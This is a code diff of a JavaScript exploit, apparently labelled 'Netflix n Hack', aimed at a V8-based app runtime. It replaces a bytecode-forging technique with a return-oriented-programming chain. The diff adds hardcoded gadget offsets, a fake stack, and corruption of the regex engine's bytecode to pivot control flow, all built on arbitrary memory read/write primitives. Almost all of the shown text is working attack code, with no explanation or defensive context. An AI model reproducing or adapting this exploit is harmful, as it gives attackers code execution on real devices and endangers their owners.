@@ -240,13 +240,10 @@ const rw = {
 let lo_arr, lo_view;
 const arw = {
     isolate: 0n,
-    base_addr: 0n,
     fake_buf_addr: 0n,
     fake_view_addr: 0n,
     fake_buf_index: 0x10,
     fake_view_index: 0x20,
-    fake_bytecode_index: 0x80,
-    fake_bytecode_size: 0x200n,
     lo_arr_data_ptr_addr: 0n,
     lo_arr_backing_store_addr: 0n,
     init() {
@@ -280,8 +277,6 @@ const arw = {
         let fake_view = this.fakeobj(this.fake_view_addr);
 
         logger.log(`fake view length: ${fake_view.byteLength}`);
-
-        this.base_addr = this.view(this.isolate, 0n, -1n, false).getBigUint64(0x28, true) - 0x896EE8n;
     },
     addrof(obj) {
         lo_arr[0] = obj;
@@ -311,13 +306,6 @@ const arw = {
         lo_view.setBigUint64((4 * this.fake_view_index) + 0x10, BigInt(offset), true);
         lo_view.setBigUint64((4 * this.fake_view_index) + 0x18, BigInt(size), true);
         return this.fakeobj(this.fake_view_addr);
-    },
-    /** @return {DataView<ArrayBuffer>} */
-    fake_bytecode() {
-        return this.view(this.fake_bytecode_addr(), 0n, this.fake_bytecode_size);
-    },
-    fake_bytecode_addr() {
-        return this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_bytecode_index);
     },
     make_fake_buf() {
         let buf = new ArrayBuffer(8);
@@ -369,282 +357,368 @@ const arw = {
 // #endregion
 // #region ROP
 const rop = {
-    index: 0,
-    bytecode_age_index: 0x21,
-    bytecode_size_index: 0x4,
-    bytecode_frame_index: 0x14,
-    bytecode_start_index: 0x22,
-    bytecodes: Object.freeze({
-        Wide: 0,
-        ExtraWide: 1,
-        DebugBreakWide: 2,
-        DebugBreakExtraWide: 3,
-        DebugBreak0: 4,
-        DebugBreak1: 5,
-        DebugBreak2: 6,
-        DebugBreak3: 7,
-        DebugBreak4: 8,
-        DebugBreak5: 9,
-        DebugBreak6: 10,
-        LdaZero: 11,
-        LdaSmi: 12,
-        LdaUndefined: 13,
-        LdaNull: 14,
-        LdaTheHole: 15,
-        LdaTrue: 16,
-        LdaFalse: 17,
-        LdaConstant: 18,
-        LdaGlobal: 19,
-        LdaGlobalInsideTypeof: 20,
-        StaGlobal: 21,
-        PushContext: 22,
-        PopContext: 23,
-        LdaContextSlot: 24,
-        LdaImmutableContextSlot: 25,
-        LdaCurrentContextSlot: 26,
-        LdaImmutableCurrentContextSlot: 27,
-        StaContextSlot: 28,
-        StaCurrentContextSlot: 29,
-        LdaLookupSlot: 30,
-        LdaLookupContextSlot: 31,
-        LdaLookupGlobalSlot: 32,
-        LdaLookupSlotInsideTypeof: 33,
-        LdaLookupContextSlotInsideTypeof: 34,
-        LdaLookupGlobalSlotInsideTypeof: 35,
-        StaLookupSlot: 36,
-        Ldar: 37,
-        Star: 38,
-        Mov: 39,
-        LdaNamedProperty: 40,
-        LdaNamedPropertyNoFeedback: 41,
-        LdaNamedPropertyFromSuper: 42,
-        LdaKeyedProperty: 43,
-        LdaModuleVariable: 44,
-        StaModuleVariable: 45,
-        StaNamedProperty: 46,
-        StaNamedPropertyNoFeedback: 47,
-        StaNamedOwnProperty: 48,
-        StaKeyedProperty: 49,
-        StaInArrayLiteral: 50,
-        StaDataPropertyInLiteral: 51,
-        CollectTypeProfile: 52,
-        Add: 53,
-        Sub: 54,
-        Mul: 55,
-        Div: 56,
-        Mod: 57,
-        Exp: 58,
-        BitwiseOr: 59,
-        BitwiseXor: 60,
-        BitwiseAnd: 61,
-        ShiftLeft: 62,
-        ShiftRight: 63,
-        ShiftRightLogical: 64,
-        AddSmi: 65,
-        SubSmi: 66,
-        MulSmi: 67,
-        DivSmi: 68,
-        ModSmi: 69,
-        ExpSmi: 70,
-        BitwiseOrSmi: 71,
-        BitwiseXorSmi: 72,
-        BitwiseAndSmi: 73,
-        ShiftLeftSmi: 74,
-        ShiftRightSmi: 75,
-        ShiftRightLogicalSmi: 76,
-        Inc: 77,
-        Dec: 78,
-        Negate: 79,
-        BitwiseNot: 80,
-        ToBooleanLogicalNot: 81,
-        LogicalNot: 82,
-        TypeOf: 83,
-        DeletePropertyStrict: 84,
-        DeletePropertySloppy: 85,
-        GetSuperConstructor: 86,
-        CallAnyReceiver: 87,
-        CallProperty: 88,
-        CallProperty0: 89,
-        CallProperty1: 90,
-        CallProperty2: 91,
-        CallUndefinedReceiver: 92,
-        CallUndefinedReceiver0: 93,
-        CallUndefinedReceiver1: 94,
-        CallUndefinedReceiver2: 95,
-        CallNoFeedback: 96,
-        CallWithSpread: 97,
-        CallRuntime: 98,
-        CallRuntimeForPair: 99,
-        CallJSRuntime: 100,
-        InvokeIntrinsic: 101,
-        Construct: 102,
-        ConstructWithSpread: 103,
-        TestEqual: 104,
-        TestEqualStrict: 105,
-        TestLessThan: 106,
-        TestGreaterThan: 107,
-        TestLessThanOrEqual: 108,
-        TestGreaterThanOrEqual: 109,
-        TestReferenceEqual: 110,
-        TestInstanceOf: 111,
-        TestIn: 112,
-        TestUndetectable: 113,
-        TestNull: 114,
-        TestUndefined: 115,
-        TestTypeOf: 116,
-        ToName: 117,
-        ToNumber: 118,
-        ToNumeric: 119,
-        ToObject: 120,
-        ToString: 121,
-        CreateRegExpLiteral: 122,
-        CreateArrayLiteral: 123,
-        CreateArrayFromIterable: 124,
-        CreateEmptyArrayLiteral: 125,
-        CreateObjectLiteral: 126,
-        CreateEmptyObjectLiteral: 127,
-        CloneObject: 128,
-        GetTemplateObject: 129,
-        CreateClosure: 130,
-        CreateBlockContext: 131,
-        CreateCatchContext: 132,
-        CreateFunctionContext: 133,
-        CreateEvalContext: 134,
-        CreateWithContext: 135,
-        CreateMappedArguments: 136,
-        CreateUnmappedArguments: 137,
-        CreateRestParameter: 138,
-        JumpLoop: 139,
-        Jump: 140,
-        JumpConstant: 141,
-        JumpIfNullConstant: 142,
-        JumpIfNotNullConstant: 143,
-        JumpIfUndefinedConstant: 144,
-        JumpIfNotUndefinedConstant: 145,
-        JumpIfUndefinedOrNullConstant: 146,
-        JumpIfTrueConstant: 147,
-        JumpIfFalseConstant: 148,
-        JumpIfJSReceiverConstant: 149,
-        JumpIfToBooleanTrueConstant: 150,
-        JumpIfToBooleanFalseConstant: 151,
-        JumpIfToBooleanTrue: 152,
-        JumpIfToBooleanFalse: 153,
-        JumpIfTrue: 154,
-        JumpIfFalse: 155,
-        JumpIfNull: 156,
-        JumpIfNotNull: 157,
-        JumpIfUndefined: 158,
-        JumpIfNotUndefined: 159,
-        JumpIfUndefinedOrNull: 160,
-        JumpIfJSReceiver: 161,
-        SwitchOnSmiNoFeedback: 162,
-        ForInEnumerate: 163,
-        ForInPrepare: 164,
-        ForInContinue: 165,
-        ForInNext: 166,
-        ForInStep: 167,
-        SetPendingMessage: 168,
-        Throw: 169,
-        ReThrow: 170,
-        Return: 171,
-        ThrowReferenceErrorIfHole: 172,
-        ThrowSuperNotCalledIfHole: 173,
-        ThrowSuperAlreadyCalledIfNotHole: 174,
-        ThrowIfNotSuperConstructor: 175,
-        SwitchOnGeneratorState: 176,
-        SuspendGenerator: 177,
-        ResumeGenerator: 178,
-        GetIterator: 179,
-        Debugger: 180,
-        IncBlockCounter: 181,
-        Abort: 182
+    base_addr: 0n,
+    rop_insert_index: 9,
+    rop_insts: [],
+    gadgets: Object.freeze({
+        RET:                                            0x0000000000000042n, // ret
+        POP_R10_RET:                                    0x000000000017F2F7n, // pop r10 ; ret
+        POP_R12_RET:                                    0x000000000033881cn, // pop r12 ; ret
+        POP_R13_RET:                                    0x00000000001874BFn, // pop r13 ; ret
+        POP_R14_RET:                                    0x00000000001FA6D5n, // pop r14 ; ret
+        POP_R15_RET:                                    0x000000000024F3C1n, // pop r15 ; ret
+        POP_R8_RET:                                     0x000000000006C232n, // pop r8 ; ret
+        POP_R9_RET:                                     0x000000000066511Bn, // pop r9 ; ret
+        POP_RAX_RET:                                    0x000000000006C233n, // pop rax ; ret
+        POP_RBP_RET:                                    0x0000000000000079n, // pop rbp ; ret
+        POP_RBX_RET:                                    0x000000000002E1EBn, // pop rbx ; ret
+        POP_RCX_RET:                                    0x0000000000002485n, // pop rcx ; ret
+        POP_RDI_RET:                                    0x00000000001A729Bn, // pop rdi ; ret
+        POP_RDX_RET:                                    0x000000000003EC42n, // pop rdx ; ret
+        POP_RSI_RET:                                    0x00000000000014D8n, // pop rsi ; ret
+        POP_RSP_RET:                                    0x00000000001DF1E1n, // pop rsp ; ret
+        INT3_RET:                                       0x0000000000178AC4n, // int3 ; ret
+        PUSH_RBP_MOV_RBP_RSP_MOV_RAX_RBP_POP_RBP_RET:   0x000000000024F2D2n, // push rbp ; mov rbp, rsp ; mov rax, rbp ; pop rbp ; ret
+        MOV_RAX_RBP_POP_RBP_RET:                        0x000000000024F2D6n, // mov rax, rbp ; pop rbp ; ret
+        POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET:               0x0000000000801819n, // pop rcx ; add rsp, rbx ; push rcx ; ret
+        MOV_RAX_QWORD_PTR_RDX_RET:                      0x00000000002EE490n, // mov rax, qword ptr [rdx] ; ret
+        MOV_QWORD_PTR_RDX_RAX_RET:                      0x000000000130F185n, // mov qword ptr [rdx], rax ; ret
+        ADD_RAX_18_RET:                                 0x000000000041D46An  // add rax, 0x18 ; ret
     }),
     init() {
-        this.pwn(0);
+        this.impl.init();
+        this.stack.init();
 
-        let pwn_addr = arw.addrof(this.pwn);
-        let shared_function_info = arw.read32(pwn_addr + 0xCn, true);
-        let function_data = arw.read32(shared_function_info + 0x4n, true);
+        this.base_addr = arw.view(0n).getBigUint64(0x28, true) - 0x8966C8n;
+        logger.log(`base_addr: ${ptr.i2h(this.base_addr)}`);
 
-        for (var i = 0; i < this.bytecode_start_index; i++) {
-            let b = arw.view(function_data).getUint8(i);
-            arw.fake_bytecode().setUint8(i, b);
+        this.rop_insts = [
+            "ADD_RAX_18_RET",
+            "POP_RDX_RET",
+            this.stack.store_addr,
+            "MOV_QWORD_PTR_RDX_RAX_RET",
+            "MOV_RAX_RBP_POP_RBP_RET",
+            0n,
+            "POP_RDX_RET",
+            this.stack.store_addr + 8n,
+            "MOV_QWORD_PTR_RDX_RAX_RET",
+            // <-- insert ROP here
+            "POP_RDX_RET",
+            this.stack.store_addr,
+            "MOV_RAX_QWORD_PTR_RDX_RET",
+            "POP_RDX_RET",
+            0,
+            "MOV_QWORD_PTR_RDX_RAX_RET",
+            "POP_RDX_RET",
+            this.stack.store_addr + 8n,
+            "MOV_RAX_QWORD_PTR_RDX_RET",
+            "POP_RDX_RET",
+            0,
+            "MOV_QWORD_PTR_RDX_RAX_RET",
+            "POP_RBP_RET",
+            1,
+            "POP_RAX_RET",
+            0n,
+            "POP_RBX_RET",
+            -0x20n,
+            "POP_RSP_RET",
+            1
+        ];
+    },
+    /** @param {string} name */
+    gadget(name) {
+        let value;
+        if (name in this.gadgets) {
+            value = this.gadgets[name];
         }
-
-        arw.fake_bytecode().setUint32(this.bytecode_frame_index, 0x200, true);
-
-        arw.write32(shared_function_info + 0x4n, ptr.itag(arw.fake_bytecode_addr()));
-
-        logger.log("Achieved ROP !!");
-    },
-    emit(inst) {
-        let value = 0;
-        switch(typeof inst) {
-            case "string":
-                if (inst in this.bytecodes) {
-                    value = this.bytecodes[inst];
-                }
-                break;
-            case "number":
-                value = inst;
-                break;
+        if (this.base_addr != 0n) {
+            value += this.base_addr;
         }
-
-        arw.fake_bytecode().setUint8(this.bytecode_start_index + this.index++, value);
-    },
-    reset() {
-        this.index = 0;
-    },
-    exec(x = 0) {
-        arw.fake_bytecode().setUint32(this.bytecode_size_index, this.index << 1, true);
-        arw.fake_bytecode().setUint8(this.bytecode_age_index, 0, true);
-
-        let value = this.pwn(x);
-        this.reset();
-        
         return value;
     },
-    pwn(x) {
-        return x + 1;
+    /** @param {Array} insts */
+    exec(insts) {
+        let rop_insts = this.rop_insts.slice(0);
+        rop_insts = rop_insts.slice(0, this.rop_insert_index).concat(insts).concat(rop_insts.slice(this.rop_insert_index));
+
+        this.stack.reset();
+        this.stack.push(rop_insts);
+        
+        this.impl.store_return();
+        this.impl.gadget_current("PUSH_RBP_MOV_RBP_RSP_MOV_RAX_RBP_POP_RBP_RET");
+        this.impl.gadget_current("POP_RSP_RET");
+        this.impl.set64_current(this.stack.inst_addr);
+        this.impl.gadget_current("POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET");
+        this.impl.restore_return();
+
+        this.impl.exec();
+    },
+    stack: {
+        offset: 0,
+        fake_index: 0x1000,
+        fake_size: 0x1000,
+        store_offset: 0,
+        inst_offset: 0,
+        store_addr: 0n,
+        inst_addr: 0n,
+        init() {
+            this.store_offset = 0;
+            this.inst_offset = this.fake_size / 2;
+            this.store_addr = arw.lo_arr_data_ptr_addr + arw.isolate + BigInt(4 * this.fake_index);
+            this.inst_addr = this.store_addr + BigInt(this.inst_offset);
+        },
+        /** @return {DataView<ArrayBuffer>} */
+        view() {
+            return arw.view(this.store_addr, 0n, BigInt(this.fake_size), false);
+        },
+        /**
+         * @param {number} index 
+         * @return {BigInt} 
+        */
+        get(index) {
+            return this.view().getBigUint64(this.store_offset + (8 * index), true);
+        },
+        /**
+         * @param {number} index
+         * @param {BigInt} value
+         * @return {BigInt} 
+        */
+        set(index, value) {
+            return this.view().setBigUint64(this.store_offset + (8 * index), value, true);
+        },
+        /** @param {Array} insts */
+        push(insts) {
+            let value;
+            let offset;
+            let offsets = [];
+            for (var i = 0; i < insts.length; i++) {
+                value = 0n,
+                offset = this.offset;
+
+                let inst = insts[i];
+                switch (typeof inst) {
+                    case "string":
+                        value = rop.gadget(inst);
+                        break;
+                    case "number":
+                        switch(inst) {
+                            case 0:
+                                value = 0n;
+                                offsets.push(offset);
+                                break;
+                            case 1:
+                                value = this.inst_addr + BigInt(offset);
+                                offset = offsets.pop();
+                                break;
+                        }
+                        break;
+                    case "bigint":
+                        value = inst;
+                        break;
+                }
+
+                this.view().setBigUint64(this.inst_offset + offset, value, true);
+                this.offset += 8;
+            }
+        },
+        reset() {
+            for (var i = 0; i < this.fake_size; i += 8) {
+                this.view().setBigUint64(i, 0n, true);
+            }
+
+            this.offset = 0;
+        }
+    },
+    impl: {
+        reg: 0,
+        offset: 0,
+        return_reg: 0x52,
+        return_store_reg: 3,
+        temp_store_reg: 5,
+        latin1_bytecode: 0n,
+        /** @type {string} */
+        str: "aaaaa",
+        /** @type {Regex} */
+        regex: /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g,
+        bytecode: Object.freeze({
+            BREAK: 0,
+            PUSH_CP: 1,
+            PUSH_BT: 2,
+            PUSH_REGISTER: 3,
+            SET_REGISTER_TO_CP: 4,
+            SET_CP_TO_REGISTER: 5,
+            SET_REGISTER_TO_SP: 6,
+            SET_SP_TO_REGISTER: 7,
+            SET_REGISTER: 8,
+            ADVANCE_REGISTER: 9,
+            POP_CP: 10,
+            POP_BT: 11,
+            POP_REGISTER: 12,
+            FAIL: 13,
+            SUCCEED: 14,
+            ADVANCE_CP: 15
+        }),
+        init() {
+            let addr_regex = arw.addrof(this.regex);
+
+            logger.log(`addr_regex: ${ptr.i2h(addr_regex)}`);
+
+            let data_addr = arw.read32(addr_regex + 0xCn, true);
+
+            logger.log(`data_addr: ${ptr.i2h(data_addr)}`);
+
+            //arw.write32(data_addr + 0x30n, -1n << 1n);
+
+            this.regex.exec(this.str);
+
+            this.latin1_bytecode = arw.read32(data_addr + 0x1Cn, true);
+
+            logger.log(`latin1_bytecode: ${ptr.i2h(this.latin1_bytecode)}`);
+
+            this.reset();
+        },
+        /** @param {BigInt} value */
+        emit32(value) {
+            arw.view(this.latin1_bytecode).setUint32(0x8 + this.offset, Number(value), true);
+            this.offset += 4;
+        },
+        /** 
+         * @param {number} op 
+         * @param {number} reg
+        */
+        emit_reg(op, reg) {
+            this.emit32((reg << 8) | op);
+        },
+        reset() {
+            this.reg = this.return_reg;
+            this.offset = 0;
+        },
+        /** 
+         * @param {number} reg 
+         * @param {BigInt} value
+        */
+        adv(reg, value) {
+            this.emit_reg(this.bytecode.ADVANCE_REGISTER, reg);
+            this.emit32(value);
+        },
+        /** 
+         * @param {number} reg
+         * @param {BigInt} value
+        */
+        set(reg, value) {
+            this.emit_reg(this.bytecode.SET_REGISTER, reg);
+            this.emit32(value);
+        },
+        /** 
+         * @param {number} src
+         * @param {number} dst
+        */
+        mov(src, dst) {
+            this.emit_reg(this.bytecode.PUSH_REGISTER, src);
+            this.emit_reg(this.bytecode.POP_REGISTER, dst);
+        },
+        /** 
+         * @param {number} reg
+         * @param {BigInt} value
+        */
+        adv64(reg, value) {
+            this.adv(reg, ptr.il(value));
+            this.adv(reg + 1, ptr.ih2il(value));
+        },
+        /** 
+         * @param {number} reg
+         * @param {BigInt} value
+        */
+        set64(reg, value) {
+            this.set(reg, ptr.il(value));
+            this.set(reg + 1, ptr.ih2il(value));
+        },
+        /** 
+         * @param {number} src
+         * @param {number} dst
+        */
+        mov64(src, dst) {
+            this.mov(src, dst);
+            this.mov(src + 1, dst + 1);
+        },
+        /** @param {BigInt} value */
+        adv_current(value) { 
+            this.adv(this.reg++, value); 
+        },
+        /** @param {BigInt} value */
+        set_current(value) { 
+            this.set(this.reg++, value); 
+        },
+        /** @param {number} reg */
+        mov_from_current(reg) { 
+            this.mov(this.reg++, reg); 
+        },
+        /** @param {number} reg */
+        mov_to_current(reg) {
+            this.mov(reg, this.reg++);
+        },
+        /** @param {BigInt} value */
+        adv64_current(value) { 
+            this.adv64(this.reg, value);
+            this.reg += 2;
+        },
+        /** @param {BigInt} value */
+        set64_current(value) { 
+            this.set64(this.reg, value);
+            this.reg += 2;
+        },
+        /** @param {number} reg */
+        mov64_from_current(reg) { 
+            this.mov64(this.reg, reg); 
+            this.reg += 2;
+        },
+        /** @param {number} reg */
+        mov64_to_current(reg) { 
+            this.mov64(reg, this.reg);
+            this.reg += 2;
+        },
+        /** @param {BigInt} addr */
+        gadget_current(name) {
+            this.set64(this.temp_store_reg, rop.gadget(name));
+            this.mov64_to_current(this.temp_store_reg);
+        },
+        store_return() {
+            this.mov64(this.return_reg, this.return_store_reg);
+        },
+        restore_return() {
+            this.mov64_to_current(this.return_store_reg);
+        },
+        exec() {
+            this.emit32(this.bytecode.FAIL);
+
+            this.regex.exec(this.str);
+
+            this.reset();
+        }
     }
 }
 // #endregion
 
 function main() {
-    logger.init();
-    logger.log("=== Netflix n Hack ===");
+    try {
+        logger.init();
+        logger.log("=== Netflix n Hack ===");
 
-    rw.init();
-    arw.init();
-    rop.init();
+        rw.init();
+        arw.init();
+        rop.init();
 
-    rop.emit("Ldar");
-    rop.emit(0);
-    rop.emit("Return");
-    
-    let value = rop.exec();
-    logger.log(`Ldar 0, ret: ${value}`);
+        rop.exec([]);
 
-    rop.emit("LdaUndefined");
-    rop.emit("Return");
-    
-    value = rop.exec();
-    logger.log(`LdaUndefined, ret: ${value}`);
+        logger.log("done");
 
-    rop.emit("LdaTrue");
-    rop.emit("Return");
-    
-    value = rop.exec();
-    logger.log(`LdaTrue, ret: ${value}`);
-
-    rop.emit("LdaZero");
-    rop.emit("Return");
-    
-    value = rop.exec();
-    logger.log(`LdaZero, ret: ${value}`);
-
-    //while (true) {}
+        //while (true) {}
+    } catch(e) {
+        logger.log(e.message);
+        logger.log(e.stack);
+    }
 }
 
+nrdp.gibbon.garbageCollect();
 ws.init("192.168.1.2", 1337, main);
 //main();
